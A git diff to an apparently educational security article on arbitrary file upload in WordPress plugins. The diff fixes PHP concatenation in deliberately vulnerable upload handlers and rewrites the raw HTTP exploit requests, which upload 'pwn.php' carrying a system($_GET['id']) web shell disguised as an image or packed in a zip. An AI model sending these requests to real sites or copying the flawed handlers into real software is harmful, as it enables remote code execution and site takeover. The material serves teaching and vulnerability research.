@@ -3,6 +3,7 @@ title: Arbitrary File Upload
 contributors:
     - rafiem
 ---
+
 ## Introduction
 
 This article covers cases of possible Arbitrary File Upload on WordPress. This includes improper file input handling inside of the plugin/theme which can be used to arbitrarily upload files including `.php` files to further achieve Remote Code Execution (RCE).
@@ -52,7 +53,7 @@ function unpack_fonts(){
         die();
     }
     
-    $file_path = WP_CONTENT_DIR + "/uploads/" + $file["name"];
+    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
     move_uploaded_file($file["tmp_name"], $file_path);
 
     $zip = new ZipArchive;
@@ -62,25 +63,29 @@ function unpack_fonts(){
         $zip->extractTo(WP_CONTENT_DIR + "/uploads/");
         $zip->close();
     }
-
 }
 ``` 
 
 To bypass the above check we need to prepare a valid zip file and add a malicious PHP file inside the zip file. Below is the example of a raw HTTP request to trigger the Arbitrary File Upload:
 
 ```http
-POST /wp-admin/admin-ajax.php?action=unpack_fonts HTTP/1.1
+POST /wp-admin/admin-ajax.php HTTP/1.1
 Host: localhost
-Content-Length: 227
-Cookie: <AUTHENTICATED_USER_COOKIE>
 Connection: close
+Cookie: <AUTHENTICATED_USER_COOKIE>
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4Qx3GCzIwMf0iOPi
+Content-Length: 352
 
-------WebKitFormBoundaryNSpLEsDZWYvEGYO1
+------WebKitFormBoundary4Qx3GCzIwMf0iOPi
+Content-Disposition: form-data; name="action"
+
+unpack_fonts
+------WebKitFormBoundary4Qx3GCzIwMf0iOPi
 Content-Disposition: form-data; name="file"; filename="pwn.zip"
 Content-Type: application/zip
 
 <MALICIOUS_ZIP_METADATA>
-------WebKitFormBoundaryNSpLEsDZWYvEGYO1--
+------WebKitFormBoundary4Qx3GCzIwMf0iOPi--
 
 ```
 
@@ -106,16 +111,16 @@ add_action("wp_ajax_nopriv_upload_image_check_mime", "upload_image_check_mime");
 function upload_image_check_mime(){
     $file = $_FILES["file"];
     $file_type = mime_content_type($file["tmp_name"]);
-    $file_path = WP_CONTENT_DIR + "/uploads/" + $file["name"];
-    
-    if(in_array($file_type, get_allowed_mime_types())){
+    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
+    $allowed_mime_type = array("image/png", "image/jpeg");
+
+    if(in_array($file_type, $allowed_mime_type)){
         move_uploaded_file($file["tmp_name"], $file_path);
         echo "file uploaded";
     }
     else{
         echo "file mime type not accepted";
     }
-
 }
 ```
 
@@ -123,18 +128,24 @@ To bypass the above check we need to prepare a valid PNG file and append a malic
 
 
 ```http
-POST /wp-admin/admin-ajax.php?action=upload_image_check_mime HTTP/1.1
+POST /wp-admin/admin-ajax.php HTTP/1.1
 Host: localhost
-Content-Length: 227
 Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4Qx3GCzIwMf0iOPi
+Content-Length: 352
 
-------WebKitFormBoundaryNSpLEsDZWYvEGYO1
+------WebKitFormBoundary4Qx3GCzIwMf0iOPi
+Content-Disposition: form-data; name="action"
+
+upload_image_check_mime
+------WebKitFormBoundary4Qx3GCzIwMf0iOPi
 Content-Disposition: form-data; name="file"; filename="pwn.php"
 Content-Type: image/png
 
 <PNG_IMAGE_METADATA>
 <?php echo system($_GET["id"]); ?>
-------WebKitFormBoundaryNSpLEsDZWYvEGYO1--
+------WebKitFormBoundary4Qx3GCzIwMf0iOPi--
+
 ```
 
 ### Image Related Check
@@ -148,7 +159,7 @@ add_action("wp_ajax_nopriv_upload_image_getimagesize", "upload_image_getimagesiz
 
 function upload_image_getimagesize(){
     $file = $_FILES["file"];
-    $file_path = WP_CONTENT_DIR + "/uploads/" + $file["name"];
+    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
     $size = getimagesize($file["tmp_name"]);
     $fileContent = file_get_contents($_FILES['file']);
 
@@ -159,25 +170,30 @@ function upload_image_getimagesize(){
     else{
         echo "invalid image size";
     }
-
 }
 ```
 
 To bypass the above check we need to prepare a valid image file and append a malicious PHP code to the image file metadata. Below is the example of a raw HTTP request to trigger the Arbitrary File Upload:
 
 ```http
-POST /wp-admin/admin-ajax.php?action=upload_image_getimagesize HTTP/1.1
+POST /wp-admin/admin-ajax.php HTTP/1.1
 Host: localhost
-Content-Length: 227
 Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4Qx3GCzIwMf0iOPi
+Content-Length: 352
 
-------WebKitFormBoundaryNSpLEsDZWYvEGYO1
+------WebKitFormBoundary4Qx3GCzIwMf0iOPi
+Content-Disposition: form-data; name="action"
+
+upload_image_getimagesize
+------WebKitFormBoundary4Qx3GCzIwMf0iOPi
 Content-Disposition: form-data; name="file"; filename="pwn.php"
-Content-Type: image/jpeg
+Content-Type: image/png
 
-<JPEG_IMAGE_METADATA>
+<PNG_IMAGE_METADATA>
 <?php echo system($_GET["id"]); ?>
-------WebKitFormBoundaryNSpLEsDZWYvEGYO1--
+------WebKitFormBoundary4Qx3GCzIwMf0iOPi--
+
 ```
 
 ## Article References
